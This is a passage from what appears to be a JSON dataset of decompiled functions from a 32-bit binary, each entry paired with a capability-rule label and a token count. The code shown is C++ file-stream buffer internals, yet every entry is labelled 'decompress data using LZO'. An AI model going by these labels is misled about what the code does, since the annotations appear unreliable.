NULL;\n        piStack100 = var_2ch_2;\n        iStack108 = 0x495c1f;\n        iStack52 = puStack104;\n        fcn.0044b110();\n        *(iStack52 + -2 + uVar7 * 2) = 0;\n        iVar4 = *0x515a34;\n        *(var_10h + 0x20) = iStack52;\n        *(var_10h + 0x24) = var_2ch_2;\n        if (iVar4 == 0) {\n            iVar4 = *(var_1ch + -4);\n            *(var_1ch + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar3 = var_1ch + -4;\n            iVar4 = *piVar3;\n            *piVar3 = *piVar3 + -1;\n        }\n        if (iVar4 < 1) {\n            piStack116 = &stack0xffffffdf;\n            var_10h_3 = 0x495d80;\n            fcn.00483750();\n        }\n        var_10h_3 = var_ch;\n        var_ch_3 = 0x495c61;\n        (**(*var_ch + 0x1c))();\n        var_2ch_2 = *(var_1ch + -0xc);\n        uVar7 = var_2ch_2 + 1;\n        if (uVar7 < 0x3fffffff) {\n            puStack104 = uVar7 * 2;\n            iStack108 = 0x495c8a;\n            iStack52 = puStack104;\n            iVar4 = fcn.004c2c50();\n            piStack96 = NULL;\n            piStack100 = var_2ch_2;\n            iStack108 = 0x495ca6;\n            puStack104 = iVar4;\n            fcn.0044b110();\n            *(var_10h + 0x28) = iVar4;\n            *(iVar4 + -2 + iStack52) = 0;\n            iVar4 = *0x515a34;\n            *(var_10h + 0x2c) = var_2ch_2;\n            if (iVar4 == 0) {\n                iVar4 = *(var_1ch + -4);\n                *(var_1ch + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar3 = var_1ch + -4;\n                iVar4 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n            }\n            if (iVar4 < 1) {\n                piStack116 = &stack0xffffffdf;\n                var_10h_3 = 0x495db0;\n                fcn.00483750();\n            }\n            var_ch_3 = 0x495ce5;\n            uVar2 = (**(*var_ch + 0x24))();\n            *(var_10h + 0x34) = uVar2;\n            var_ch_3 = 0x495cef;\n            uVar2 = (**(*var_ch + 0x28))();\n            *(var_10h + 0x38) = uVar2;\n            return;\n        }\n        iStack108 = 0x495df1;\n        fcn.004c33a0();\n    }\n    else {\n        puStack104 = 0x495dc5;\n        fcn.004c33a0();\n        piStack100 = &stack0xffffffdf;\n        puStack104 = 0x495dd6;\n        fcn.0048b630();\n        puStack104 = var_10h;\n        iStack108 = 0x495ddf;\n        fcn.0043a8e0();\ncode_r0x00495ddf:\n        iStack108 = 0x495de4;\n        var_10h = fcn.004c33a0();\n    }\n    puStack104 = &stack0xffffffdf;\n    iStack108 = 0x495e02;\n    fcn.00483770();\n    puStack112 = 0x495e0b;\n    iStack108 = var_10h;\n    fcn.0043a8e0();\n    piVar6 = piStack96;\n    piVar3 = piStack100;\n    var_10h_3 = var_ch;\n    var_ch_3 = var_10h;\n    piStack116 = uVar7;\n    puStack112 = &stack0xfffffffc;\n    uVar1 = (**(*piStack100 + 8))();\n    *(piVar6 + 0x12) = uVar1;\n    uVar1 = (**(*piVar3 + 0xc))();\n    *(piVar6 + 5) = uVar1;\n    iVar4 = (**(*piVar3 + 0x20))();\n    piVar6[2] = 0;\n    piVar6[0xc] = iVar4;\n    piVar6[6] = 0;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x52) = 1;\n    (**(*piVar3 + 0x10))(piVar3);\n    iVar4 = fcn.004c2c50(var_30h_2 + 1);\n    fcn.00454b80(iVar4, var_30h_2, 0);\n    piVar6[3] = var_30h_2;\n    *(iVar4 + var_30h_2) = 0;\n    piVar6[2] = iVar4;\n    if (puStack160 != &fcn.00495a90::var_2ch_3) {\n        fcn.004c2c30(puStack160);\n    }\n    (**(*piVar3 + 0x14))(piVar3);\n    if (var_30h_2 + 1U < 0x3fffffff) {\n        iVar4 = (var_30h_2 + 1U) * 2;\n        iVar5 = fcn.004c2c50(iVar4);\n        fcn.00455930(iVar5, var_30h_2, 0);\n        piVar6[6] = iVar5;\n        piVar6[7] = var_30h_2;\n        *(iVar5 + -2 + iVar4) = 0;\n        if (puStack160 != &fcn.00495a90::var_2ch_3) {\n            fcn.004c2c30(puStack160);\n        }\n        (**(*piVar3 + 0x18))(piVar3);\n        if (var_30h_2 + 1U < 0x3fffffff) {\n            iVar4 = (var_30h_2 + 1U) * 2;\n            iVar5 = fcn.004c2c50(iVar4);\n            fcn.00455930(iVar5, var_30h_2, 0);\n            *(iVar5 + -2 + iVar4) = 0;\n            piVar6[8] = iVar5;\n            piVar6[9] = var_30h_2;\n            if (puStack160 != &fcn.00495a90::var_2ch_3) {\n                fcn.004c2c30(puStack160);\n            }\n            (**(*piVar3 + 0x1c))(piVar3);\n            if (var_30h_2 + 1U < 0x3fffffff) {\n                iVar4 = (var_30h_2 + 1U) * 2;\n                iVar5 = fcn.004c2c50(iVar4);\n                fcn.00455930(iVar5, var_30h_2, 0);\n                piVar6[10] = iVar5;\n                *(iVar5 + -2 + iVar4) = 0;\n                piVar6[0xb] = var_30h_2;\n                if (puStack160 != &fcn.00495a90::var_2ch_3) {\n                    fcn.004c2c30(puStack160);\n                }\n                iVar4 = (**(*piVar3 + 0x24))();\n                piVar6[0xd] = iVar4;\n                iVar4 = (**(*piVar3 + 0x28))();\n                piVar6[0xe] = iVar4;\n                return;\n            }\n            piVar6 = fcn.004c33a0();\n            goto code_r0x0049604c;\n        }\n    }\n    else {\n        fcn.004c33a0();\n    }\n    fcn.004c33a0();\ncode_r0x0049604c:\n    if (puStack160 != &fcn.00495a90::var_2ch_3) {\n        fcn.004c2c30(puStack160);\n    }\n    fcn.0043a8e0(piVar6);\n    *extraout_ECX = 0x52c0a0;\n    fcn.004be620(extraout_ECX + 4);\n    *extraout_ECX = 0x52be00;\n    fcn.00490df0();\n    fcn.004c2c30(extraout_ECX);\n    return;\n}\n",
        "token_count": 3400
    },
    "00495e10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00495e10(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x12) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 0x14) = uVar1;\n    uVar2 = (**(*arg_ch + 0x20))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x30) = uVar2;\n    *(arg_10h + 0x18) = 0;\n    *(arg_10h + 0x20) = 0;\n    *(arg_10h + 0x28) = 0;\n    *(arg_10h + 0x52) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar3 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar3, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar3 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar3;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    if (var_2ch + 1U < 0x3fffffff) {\n        iVar3 = (var_2ch + 1U) * 2;\n        iVar4 = fcn.004c2c50(iVar3);\n        fcn.00455930(iVar4, var_2ch, 0);\n        *(arg_10h + 0x18) = iVar4;\n        *(arg_10h + 0x1c) = var_2ch;\n        *(iVar4 + -2 + iVar3) = 0;\n        if (var_30h != &var_28h) {\n            fcn.004c2c30(var_30h);\n        }\n        (**(*arg_ch + 0x18))(arg_ch);\n        if (var_2ch + 1U < 0x3fffffff) {\n            iVar3 = (var_2ch + 1U) * 2;\n            iVar4 = fcn.004c2c50(iVar3);\n            fcn.00455930(iVar4, var_2ch, 0);\n            *(iVar4 + -2 + iVar3) = 0;\n            *(arg_10h + 0x20) = iVar4;\n            *(arg_10h + 0x24) = var_2ch;\n            if (var_30h != &var_28h) {\n                fcn.004c2c30(var_30h);\n            }\n            (**(*arg_ch + 0x1c))(arg_ch);\n            if (var_2ch + 1U < 0x3fffffff) {\n                iVar3 = (var_2ch + 1U) * 2;\n                iVar4 = fcn.004c2c50(iVar3);\n                fcn.00455930(iVar4, var_2ch, 0);\n                *(arg_10h + 0x28) = iVar4;\n                *(iVar4 + -2 + iVar3) = 0;\n                *(arg_10h + 0x2c) = var_2ch;\n                if (var_30h != &var_28h) {\n                    fcn.004c2c30(var_30h);\n                }\n                uVar2 = (**(*arg_ch + 0x24))();\n                *(arg_10h + 0x34) = uVar2;\n                uVar2 = (**(*arg_ch + 0x28))();\n                *(arg_10h + 0x38) = uVar2;\n                return;\n            }\n            arg_10h = fcn.004c33a0();\n            goto code_r0x0049604c;\n        }\n    }\n    else {\n        fcn.004c33a0();\n    }\n    fcn.004c33a0();\ncode_r0x0049604c:\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    fcn.0043a8e0(arg_10h);\n    *extraout_ECX = 0x52c0a0;\n    fcn.004be620(extraout_ECX + 4);\n    *extraout_ECX = 0x52be00;\n    fcn.00490df0();\n    fcn.004c2c30(extraout_ECX);\n    return;\n}\n",
        "token_count": 1183
    },
    "004a0e00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004a0e00(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar auStack13 [9];\n    \n    iVar3 = *0x515a34;\n    *param_1 = 0x52c210;\n    iVar2 = param_1[1];\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 + -4);\n        *(iVar2 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar2 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        fcn.004bca60();\n        return;\n    }\n    fcn.0048b610(auStack13);\n    fcn.004bca60();\n    return;\n}\n",
        "token_count": 214
    },
    "00496250": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00496250(int32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    int32_t *piVar5;\n    int32_t aiStack240 [5];\n    int32_t *piStack220;\n    uint32_t uStack216;\n    int32_t iStack200;\n    uint32_t uStack196;\n    uint8_t uStack181;\n    int32_t iStack176;\n    uchar auStack156 [4];\n    int32_t iStack152;\n    \n    uStack216 = 1;\n    if (param_1[4] < param_1[5]) {\n        uVar2 = (**(*param_1 + 0x34))();\n        uStack216 = uVar2 & 0xffffff00 | uVar2 != 0xffffffff;\n    }\n    if (*(param_1 + 0x4a) == '\\0') {\n        return uStack216;\n    }\n    if (param_1[0x16] != NULL) {\n        uStack181 = (**(*param_1[0x16] + 0x18))();\n        if (uStack181 != 0) {\n            return uStack216;\n        }\n        if (uStack216 == '\\0') {\n            return uStack216;\n        }\n        do {\n            uVar2 = (**(*param_1[0x16] + 0xc))();\n            if (uVar2 == 2) goto code_r0x00496300;\n            if ((1 < uVar2) || (iStack152 - auStack156 < 1)) break;\n            iVar3 = fcn.004903a0();\n            if (iStack176 != iVar3) goto code_r0x00496300;\n        } while (uVar2 == 1);\n        iVar3 = (**(*param_1 + 0x34))();\n        uStack181 = iVar3 != -1;\ncode_r0x00496300:\n        return uStack181;\n    }\n    fcn.004bde60();\n    piStack220 = param_1;\n    if (*(extraout_ECX + 0x58) == NULL) goto code_r0x004964af;\n    cVar1 = (**(**(extraout_ECX + 0x58) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(extraout_ECX + 0x58) + 0x20))();\n        fcn.00437ed0();\n        piVar5 = aiStack240 + 1;\n        uVar2 = (**(**(extraout_ECX + 0x58) + 8))\n                          (extraout_ECX + 0x38, iStack200, iStack200 + uStack196, piVar5, aiStack240, \n                           extraout_EDX + aiStack240, aiStack240);\n        if (uVar2 < 2) {\n            uStack196 = aiStack240[0] - aiStack240;\n            iVar3 = aiStack240[0];\n            uVar4 = fcn.004903a0(aiStack240, uStack196);\n            if ((uStack196 != uVar4) || ((uVar2 & 1) == 0)) goto code_r0x004963fe;\n            iVar3 = (**(**(extraout_ECX + 0x58) + 8))\n                              (piVar5, aiStack240[1], *(extraout_ECX + 0x14), aiStack240 + 1, aiStack240, iVar3, \n                               aiStack240);\n            if (iVar3 != 2) {\n                uVar4 = aiStack240[0] - aiStack240;\n                uVar2 = fcn.004903a0(aiStack240, uVar4);\n                return uVar2 & 0xffffff00 | uVar2 == uVar4;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x004963e9;\n        fcn.004bdff0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x004964af:\n        fcn.004bde60();\n        if (*(extraout_ECX_00 + 0x48) != '\\0') {\n            if (*(extraout_ECX_00 + 0x40) != 0) {\n                fcn.004c2c20(*(extraout_ECX_00 + 0x40));\n            }\n            *(extraout_ECX_00 + 0x40) = 0;\n            *(extraout_ECX_00 + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX_00 + 0x5c);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004c2c20(uVar2);\n        }\n        *(extraout_ECX_00 + 0x5c) = 0;\n        *(extraout_ECX_00 + 0x60) = 0;\n        *(extraout_ECX_00 + 100) = 0;\n        *(extraout_ECX_00 + 0x68) = 0;\n        return uVar2;\n    }\ncode_r0x004963e9:\n    uVar4 = fcn.004903a0(iStack200, uStack196);\ncode_r0x004963fe:\n    return uVar4 & 0xffffff00 | uVar4 == uStack196;\n}\n",
        "token_count": 1241
    },
    "00497a20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00497a20(uint *param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    fcn.004a5a80(param_2);\n    param_1[9] = 0;\n    uVar2 = *(param_2 + 0x28);\n    *param_1 = 0x52c0c8;\n    param_1[10] = uVar2;\n    uVar1 = *(param_2 + 0x2c);\n    param_1[8] = 0;\n    *(param_1 + 0xb) = uVar1;\n    uVar2 = *(param_2 + 0x30);\n    *(param_2 + 0x28) = 0;\n    *(param_2 + 0x2c) = 0;\n    *(param_2 + 0x30) = 0;\n    param_1[0xc] = uVar2;\n    param_1[0xd] = *(param_2 + 0x34);\n    param_1[0xe] = *(param_2 + 0x38);\n    param_1[0xf] = *(param_2 + 0x3c);\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x40) = 0;\n    param_1[0x10] = uVar2;\n    uVar2 = *(param_2 + 0x44);\n    *(param_2 + 0x44) = 1;\n    param_1[0x11] = uVar2;\n    uVar1 = *(param_2 + 0x48);\n    *(param_2 + 0x48) = 0;\n    *(param_1 + 0x12) = uVar1;\n    uVar1 = *(param_2 + 0x49);\n    *(param_2 + 0x49) = 0;\n    *(param_1 + 0x49) = uVar1;\n    uVar1 = *(param_2 + 0x4a);\n    *(param_2 + 0x4a) = 0;\n    *(param_1 + 0x4a) = uVar1;\n    *(param_1 + 0x4b) = *(param_2 + 0x4b);\n    uVar2 = *(param_2 + 0x4c);\n    *(param_2 + 0x4c) = 0;\n    param_1[0x13] = uVar2;\n    uVar2 = *(param_2 + 0x50);\n    *(param_2 + 0x50) = 0;\n    param_1[0x14] = uVar2;\n    uVar1 = *(param_2 + 0x54);\n    *(param_2 + 0x54) = 0;\n    *(param_1 + 0x15) = uVar1;\n    param_1[0x16] = *(param_2 + 0x58);\n    uVar2 = *(param_2 + 0x5c);\n    *(param_2 + 0x5c) = 0;\n    param_1[0x17] = uVar2;\n    uVar2 = *(param_2 + 0x60);\n    *(param_2 + 0x60) = 0;\n    param_1[0x18] = uVar2;\n    uVar2 = *(param_2 + 100);\n    *(param_2 + 100) = 0;\n    param_1[0x19] = uVar2;\n    uVar2 = *(param_2 + 0x68);\n    *(param_2 + 0x68) = 0;\n    param_1[0x1a] = uVar2;\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x14) = 0;\n    *(param_2 + 4) = uVar2;\n    *(param_2 + 8) = uVar2;\n    *(param_2 + 0xc) = uVar2;\n    *(param_2 + 0x10) = 0;\n    *(param_2 + 0x18) = 0;\n    *(param_2 + 0x38) = *(param_2 + 0x34);\n    *(param_2 + 0x3c) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 1015
    },
    "00497b60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00497b60(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.004aec10();\n    *param_1 = 0x52c0c8;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.004905d0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    *(param_1 + 0x15) = 0;\n    param_1[0x16] = NULL;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    cVar1 = fcn.004bf2d0(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004c0220(param_1 + 7);\n    param_1[0x16] = pcVar2;\n    return;\n}\n",
        "token_count": 429
    },
    "00497dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00497dc0(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.004aec10();\n    *param_1 = 0x52c0c8;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.004905d0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    param_1[0x12] = NULL;\n    param_1[0x13] = NULL;\n    param_1[0x14] = NULL;\n    *(param_1 + 0x15) = 0;\n    param_1[0x16] = NULL;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    cVar1 = fcn.004bf2d0(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004c0220(param_1 + 7);\n    param_1[0x16] = pcVar2;\n    return;\n}\n",
        "token_count": 429
    },
    "004981e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004981e0(int32_t *param_1)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    int32_t *piVar6;\n    int32_t aiStack240 [5];\n    int32_t *piStack220;\n    uint32_t uStack216;\n    int32_t iStack200;\n    uint32_t uStack196;\n    uint8_t uStack181;\n    int32_t iStack176;\n    uchar auStack156 [4];\n    int32_t iStack152;\n    \n    uStack216 = 1;\n    if (param_1[4] < param_1[5]) {\n        uVar3 = (**(*param_1 + 0x34))();\n        uStack216 = uVar3 & 0xffffff00 | uVar3 != -1;\n    }\n    if (*(param_1 + 0x4a) == '\\0') {\n        return uStack216;\n    }\n    if (param_1[0x17] != NULL) {\n        uStack181 = (**(*param_1[0x17] + 0x18))();\n        if (uStack181 != 0) {\n            return uStack216;\n        }\n        if (uStack216 == '\\0') {\n            return uStack216;\n        }\n        do {\n            uVar3 = (**(*param_1[0x17] + 0xc))();\n            if (uVar3 == 2) goto code_r0x00498290;\n            if ((1 < uVar3) || (iStack152 - auStack156 < 1)) break;\n            iVar4 = fcn.004903a0();\n            if (iStack176 != iVar4) goto code_r0x00498290;\n        } while (uVar3 == 1);\n        iVar2 = (**(*param_1 + 0x34))();\n        uStack181 = iVar2 != -1;\ncode_r0x00498290:\n        return uStack181;\n    }\n    fcn.004bde60();\n    piStack220 = param_1;\n    if (*(extraout_ECX + 0x5c) == NULL) goto code_r0x0049843f;\n    cVar1 = (**(**(extraout_ECX + 0x5c) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(extraout_ECX + 0x5c) + 0x20))();\n        fcn.00437ed0();\n        piVar6 = aiStack240 + 1;\n        uVar3 = (**(**(extraout_ECX + 0x5c) + 8))\n                          (extraout_ECX + 0x38, iStack200, iStack200 + uStack196 * 2, piVar6, aiStack240, \n                           extraout_EDX + aiStack240, aiStack240);\n        if (uVar3 < 2) {\n            uStack196 = aiStack240[0] - aiStack240;\n            iVar4 = aiStack240[0];\n            uVar5 = fcn.004903a0(aiStack240, uStack196);\n            if ((uStack196 != uVar5) || ((uVar3 & 1) == 0)) goto code_r0x0049838c;\n            iVar4 = (**(**(extraout_ECX + 0x5c) + 8))\n                              (piVar6, aiStack240[1], *(extraout_ECX + 0x14), aiStack240 + 1, aiStack240, iVar4, \n                               aiStack240);\n            if (iVar4 != 2) {\n                uVar5 = aiStack240[0] - aiStack240;\n                uVar3 = fcn.004903a0(aiStack240, uVar5);\n                return uVar3 & 0xffffff00 | uVar3 == uVar5;\n            }\n        }\n        else if (uVar3 == 3) goto code_r0x00498377;\n        fcn.004bdff0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x0049843f:\n        fcn.004bde60();\n        if (*(extraout_ECX_00 + 0x48) != '\\0') {\n            if (*(extraout_ECX_00 + 0x40) != 0) {\n                fcn.004c2c20(*(extraout_ECX_00 + 0x40));\n            }\n            *(extraout_ECX_00 + 0x40) = 0;\n            *(extraout_ECX_00 + 0x48) = 0;\n        }\n        uVar3 = *(extraout_ECX_00 + 0x60);\n        if (uVar3 != 0) {\n            uVar3 = fcn.004c2c20(uVar3);\n        }\n        *(extraout_ECX_00 + 0x60) = 0;\n        *(extraout_ECX_00 + 100) = 0;\n        *(extraout_ECX_00 + 0x68) = 0;\n        *(extraout_ECX_00 + 0x6c) = 0;\n        return uVar3;\n    }\ncode_r0x00498377:\n    uVar5 = fcn.004903a0(iStack200, uStack196);\ncode_r0x0049838c:\n    return uVar5 & 0xffffff00 | uVar5 == uStack196;\n}\n",
        "token_count": 1257
    },
    "004999f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004999f0(uint *param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    \n    fcn.004a6420(param_2);\n    param_1[9] = 0;\n    uVar2 = *(param_2 + 0x28);\n    *param_1 = 0x52c108;\n    param_1[10] = uVar2;\n    uVar1 = *(param_2 + 0x2c);\n    param_1[8] = 0;\n    *(param_1 + 0xb) = uVar1;\n    uVar2 = *(param_2 + 0x30);\n    *(param_2 + 0x28) = 0;\n    *(param_2 + 0x2c) = 0;\n    *(param_2 + 0x30) = 0;\n    param_1[0xc] = uVar2;\n    param_1[0xd] = *(param_2 + 0x34);\n    param_1[0xe] = *(param_2 + 0x38);\n    param_1[0xf] = *(param_2 + 0x3c);\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x40) = 0;\n    param_1[0x10] = uVar2;\n    uVar2 = *(param_2 + 0x44);\n    *(param_2 + 0x44) = 1;\n    param_1[0x11] = uVar2;\n    uVar1 = *(param_2 + 0x48);\n    *(param_2 + 0x48) = 0;\n    *(param_1 + 0x12) = uVar1;\n    uVar1 = *(param_2 + 0x49);\n    *(param_2 + 0x49) = 0;\n    *(param_1 + 0x49) = uVar1;\n    uVar1 = *(param_2 + 0x4a);\n    *(param_2 + 0x4a) = 0;\n    *(param_1 + 0x4a) = uVar1;\n    *(param_1 + 0x13) = *(param_2 + 0x4c);\n    uVar2 = *(param_2 + 0x50);\n    *(param_2 + 0x50) = 0;\n    param_1[0x14] = uVar2;\n    uVar2 = *(param_2 + 0x54);\n    *(param_2 + 0x54) = 0;\n    param_1[0x15] = uVar2;\n    uVar1 = *(param_2 + 0x58);\n    *(param_2 + 0x58) = 0;\n    *(param_1 + 0x16) = uVar1;\n    param_1[0x17] = *(param_2 + 0x5c);\n    uVar2 = *(param_2 + 0x60);\n    *(param_2 + 0x60) = 0;\n    param_1[0x18] = uVar2;\n    uVar2 = *(param_2 + 100);\n    *(param_2 + 100) = 0;\n    param_1[0x19] = uVar2;\n    uVar2 = *(param_2 + 0x68);\n    *(param_2 + 0x68) = 0;\n    param_1[0x1a] = uVar2;\n    uVar2 = *(param_2 + 0x6c);\n    *(param_2 + 0x6c) = 0;\n    param_1[0x1b] = uVar2;\n    uVar2 = *(param_2 + 0x40);\n    *(param_2 + 0x14) = 0;\n    *(param_2 + 4) = uVar2;\n    *(param_2 + 8) = uVar2;\n    *(param_2 + 0xc) = uVar2;\n    *(param_2 + 0x10) = 0;\n    *(param_2 + 0x18) = 0;\n    *(param_2 + 0x38) = *(param_2 + 0x34);\n    *(param_2 + 0x3c) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 1011
    },
    "00499b30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00499b30(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.004aec10();\n    *param_1 = 0x52c108;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.004905d0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x4a) = 0;\n    *(param_1 + 0x13) = 0;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    *(param_1 + 0x16) = 0;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    param_1[0x1b] = NULL;\n    cVar1 = fcn.004bf320(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004c0280(param_1 + 7);\n    param_1[0x17] = pcVar2;\n    return;\n}\n",
        "token_count": 455
    },
    "00499da0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00499da0(code **param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.ages_bynameIcE.0;\n    param_1[1] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    fcn.004aec10();\n    *param_1 = 0x52c108;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    fcn.004905d0(param_1 + 8);\n    param_1[0xc] = NULL;\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xf] = NULL;\n    param_1[0x10] = NULL;\n    param_1[0x11] = 0x200;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x4a) = 0;\n    *(param_1 + 0x13) = 0;\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    *(param_1 + 0x16) = 0;\n    param_1[0x17] = NULL;\n    param_1[0x18] = NULL;\n    param_1[0x19] = NULL;\n    param_1[0x1a] = NULL;\n    param_1[0x1b] = NULL;\n    cVar1 = fcn.004bf320(param_1 + 7);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    pcVar2 = fcn.004c0280(param_1 + 7);\n    param_1[0x17] = pcVar2;\n    return;\n}\n",
        "token_count": 455
    },
    "0049a240": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
